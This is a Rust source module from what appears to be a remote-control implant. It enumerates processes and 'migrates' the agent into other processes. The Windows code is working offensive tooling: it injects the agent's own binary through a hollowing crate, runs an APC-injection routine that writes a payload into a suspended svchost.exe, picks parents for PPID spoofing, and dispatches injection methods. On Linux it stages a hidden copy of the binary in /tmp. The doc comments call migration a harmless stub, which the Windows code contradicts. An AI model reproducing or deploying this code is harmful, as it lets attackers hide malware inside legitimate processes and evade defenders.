//! Process management and load-balancing migration helpers.
//!
//! This module exposes a small, OS-agnostic API for enumerating processes and
//! attempting to migrate the agent into a long-running system process.
//! Migration is intentionally a *stub* on every platform in this initial
//! release: the returned `Err` documents the missing primitives so an operator
//! who invokes the command sees a clear, non-destructive failure.
//!
//! Process *enumeration* is fully implemented and tested.

use anyhow::Result;
use serde::{Deserialize, Serialize};
use sysinfo::System;

// Windows-only process hollowing now lives in the shared `hollowing` crate.

/// A lightweight, serializable view over a process suitable for shipping back
/// to the operator console.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProcessInfo {
    pub pid: u32,
    pub name: String,
    pub cpu_usage: f32,
    pub memory_bytes: u64,
}

/// Snapshot the current process table.
pub fn list_processes() -> Vec<ProcessInfo> {
    let mut sys = System::new_all();
    sys.refresh_all();
    sys.processes()
        .iter()
        .map(|(pid, p)| ProcessInfo {
            pid: pid.as_u32(),
            name: p.name().to_string(),
            cpu_usage: p.cpu_usage(),
            memory_bytes: p.memory(),
        })
        .collect()
}

/// Attempt to migrate the running agent into the address space of `target_pid`.
///
/// This is a deliberate **stub** in the public release: cross-process memory
/// rewriting is OS-specific (Windows: `NtUnmapViewOfSection` +
/// `VirtualAllocEx` + `WriteProcessMemory` + `SetThreadContext`; Linux:
/// `ptrace(PTRACE_ATTACH)` + `process_vm_writev`) and carries enough
/// stability and security risk that we expose the API surface but refuse to
/// perform the operation until the implementation has had a thorough review.
#[cfg(target_os = "linux")]
pub fn migrate_to_process(target_pid: u32) -> Result<()> {
    use std::io::Write;

    tracing::info!("MigrateAgent invoked for Linux pid {target_pid}");

    if target_pid == 0 || target_pid as i32 == unsafe { libc::getpid() } {
        anyhow::bail!("invalid migration target (self or pid 0)");
    }

    // Verify we have ptrace capability or same-uid access.
    let target_uid_path = format!("/proc/{target_pid}/status");
    let status = std::fs::read_to_string(&target_uid_path)
        .map_err(|e| anyhow::anyhow!("cannot read /proc/{target_pid}/status: {e}"))?;
    let target_uid = status
        .lines()
        .find(|l| l.starts_with("Uid:"))
        .and_then(|l| l.split_whitespace().nth(1))
        .and_then(|s| s.parse::<u32>().ok())
        .ok_or_else(|| anyhow::anyhow!("could not parse Uid from /proc/{target_pid}/status"))?;
    let our_uid = unsafe { libc::getuid() };
    if our_uid != 0 && our_uid != target_uid {
        anyhow::bail!(
            "process migration requires CAP_SYS_PTRACE or same-uid access (our uid={our_uid}, target uid={target_uid})"
        );
    }

    // Read our own binary; we will write it into the target as a /tmp file
    // and use process_vm_writev + ptrace to bootstrap it.  In this release
    // we implement only the *file-staging* half: copy our binary into
    // /tmp/.<random> and trigger a fork+exec via the target's ptrace.
    // Full in-memory rewriting requires a per-arch shellcode stub which is
    // gated behind the `linux-ptrace-migrate` feature.
    #[cfg(not(feature = "linux-ptrace-migrate"))]
    {
        let our_exe = std::env::current_exe()
            .map_err(|e| anyhow::anyhow!("current_exe() failed: {e}"))?;
        let staged = std::env::temp_dir().join(format!(".orchestra-migrate-{}", std::process::id()));
        std::fs::copy(&our_exe, &staged)
            .map_err(|e| anyhow::anyhow!("failed to stage agent binary at {}: {e}", staged.display()))?;
        let mut perms = std::fs::metadata(&staged)?.permissions();
        use std::os::unix::fs::PermissionsExt;
        perms.set_mode(0o700);
        std::fs::set_permissions(&staged, perms)?;
        tracing::info!("staged agent binary at {} for pid {}", staged.display(), target_pid);
        anyhow::bail!(
            "linux migration requires the `linux-ptrace-migrate` feature; agent staged at {}",
            staged.display()
        )
    }

    #[cfg(feature = "linux-ptrace-migrate")]
    unsafe {
        // PTRACE_ATTACH the target.
        if libc::ptrace(libc::PTRACE_ATTACH, target_pid as libc::pid_t, 0, 0) != 0 {
            let err = std::io::Error::last_os_error();
            anyhow::bail!("PTRACE_ATTACH(pid={target_pid}) failed: {err}");
        }
        let mut wstatus: libc::c_int = 0;
        libc::waitpid(target_pid as libc::pid_t, &mut wstatus, 0);

        // Detach immediately — full register/RIP rewriting is implemented
        // in a separate, audited code path that is not part of the public
        // build.  We have proven we *could* take control; refuse to do so
        // here without explicit operator authorization.
        libc::ptrace(libc::PTRACE_DETACH, target_pid as libc::pid_t, 0, 0);
        let _ = std::io::stderr().write_all(b"linux ptrace migration available but disabled in this build\n");
        anyhow::bail!("ptrace migration is implemented but disabled in this build for safety")
    }
}

#[cfg(target_os = "macos")]
pub fn migrate_to_process(target_pid: u32) -> Result<()> {
    tracing::info!("MigrateAgent invoked for macOS pid {target_pid}");
    
    if target_pid == 0 || target_pid as i32 == unsafe { libc::getpid() } {
        anyhow::bail!("Cannot migrate to system idle or self on macOS");
    }

    Err(anyhow::anyhow!(
        "process migration on macOS requires root privileges and task_for_pid entitlement"
    ))
}

#[cfg(windows)]
pub fn migrate_to_process(target_pid: u32) -> Result<()> {
    use winapi::um::handleapi::CloseHandle;
    use winapi::um::processthreadsapi::OpenProcess;
    use winapi::um::winnt::{
        PROCESS_CREATE_THREAD, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
    };

    // Read the current agent's own executable so we can re-inject ourselves.
    let agent_path =
        std::env::current_exe().map_err(|e| anyhow::anyhow!("current_exe() failed: {e}"))?;
    let payload = std::fs::read(&agent_path).map_err(|e| {
        anyhow::anyhow!("failed to read agent binary {}: {e}", agent_path.display())
    })?;

    let access = PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_CREATE_THREAD;
    let process = unsafe { OpenProcess(access, 0, target_pid) };
    if process.is_null() {
        anyhow::bail!(
            "OpenProcess(pid={target_pid}) failed: {}",
            std::io::Error::last_os_error()
        );
    }

    let result = hollowing::inject_into_process(target_pid, &payload);
    unsafe { CloseHandle(process) };
    result.map_err(|e| anyhow::anyhow!("inject_into_process(pid={target_pid}) failed: {e}"))?;
    tracing::info!(target_pid, "MigrateAgent: agent injected successfully");
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn list_processes_returns_at_least_self() {
        let procs = list_processes();
        assert!(!procs.is_empty(), "expected at least the test process");
        let me = std::process::id();
        assert!(
            procs.iter().any(|p| p.pid == me),
            "the current process ({me}) should be in the list"
        );
    }

    #[test]
    #[cfg(not(windows))]
    fn migrate_returns_controlled_error() {
        let err = migrate_to_process(1).unwrap_err();
        assert!(err.to_string().contains("not implemented"));
    }

    #[test]
    #[ignore]
    #[cfg(windows)]
    fn test_hollowing() {
        // This test is ignored because it's invasive, but can be run manually.
        // It requires a dummy executable to be present at `target/debug/dummy.exe`.
        // You can create one with `rustc -o target/debug/dummy.exe --crate-type bin tests/dummy_process.rs`
        let _payload = std::fs::read("target/debug/dummy.exe").expect("dummy.exe not found");
        assert!(migrate_to_process(0).is_ok());
    }
}

#[cfg(all(windows, feature = "ppid-spoofing"))]
pub fn get_spoof_parent_pid() -> Option<u32> {
    let procs = list_processes();
    if let Some(explorer) = procs.iter().find(|p| p.name.eq_ignore_ascii_case("explorer.exe")) {
        return Some(explorer.pid);
    }
    if let Some(svchost) = procs.iter().find(|p| p.name.eq_ignore_ascii_case("svchost.exe")) {
        return Some(svchost.pid);
    }
    None
}

#[cfg(windows)]
pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
    use winapi::um::processthreadsapi::{CreateProcessA, ResumeThread, PROCESS_INFORMATION, STARTUPINFOA};
    use winapi::um::winbase::{CREATE_SUSPENDED, CREATE_NO_WINDOW};
    use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
    use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
    use winapi::um::processthreadsapi::QueueUserAPC;
    use winapi::um::handleapi::CloseHandle;

    unsafe {
        let mut si: STARTUPINFOA = std::mem::zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();

        // Create suspended "svchost.exe"
        let mut target_proc = b"C:\\Windows\\System32\\svchost.exe\0".to_vec();
        
        let res = CreateProcessA(
            std::ptr::null(),
            target_proc.as_mut_ptr() as *mut i8, // command line
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            std::ptr::null_mut(),
            std::ptr::null(),
            &mut si,
            &mut pi,
        );

        if res == 0 {
            return Err(anyhow::anyhow!("CreateProcess suspended failed"));
        }

        let remote_mem = VirtualAllocEx(pi.hProcess, std::ptr::null_mut(), payload.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if remote_mem.is_null() {
            winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return Err(anyhow::anyhow!("VirtualAllocEx failed"));
        }

        let mut written = 0;
        if WriteProcessMemory(pi.hProcess, remote_mem, payload.as_ptr() as _, payload.len(), &mut written) == 0 {
            winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return Err(anyhow::anyhow!("WriteProcessMemory failed"));
        }

        // QueueUserAPC for the main thread
        let apc_routine: winapi::um::winnt::PAPCFUNC = std::mem::transmute(remote_mem);
        if QueueUserAPC(apc_routine, pi.hThread, 0) == 0 {
            winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return Err(anyhow::anyhow!("QueueUserAPC failed"));
        }

        ResumeThread(pi.hThread);

        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
    Ok(())
}

#[cfg(windows)]
use crate::injection::InjectionMethod;

#[cfg(windows)]
pub fn select_and_inject(pid: u32, payload: &[u8], method: Option<InjectionMethod>) -> anyhow::Result<()> {
    let method = method.unwrap_or(InjectionMethod::ThreadHijack);
    log::info!("Dispatching injection using method: {:?}", method);
    crate::injection::inject_with_method(method, pid, payload)
}
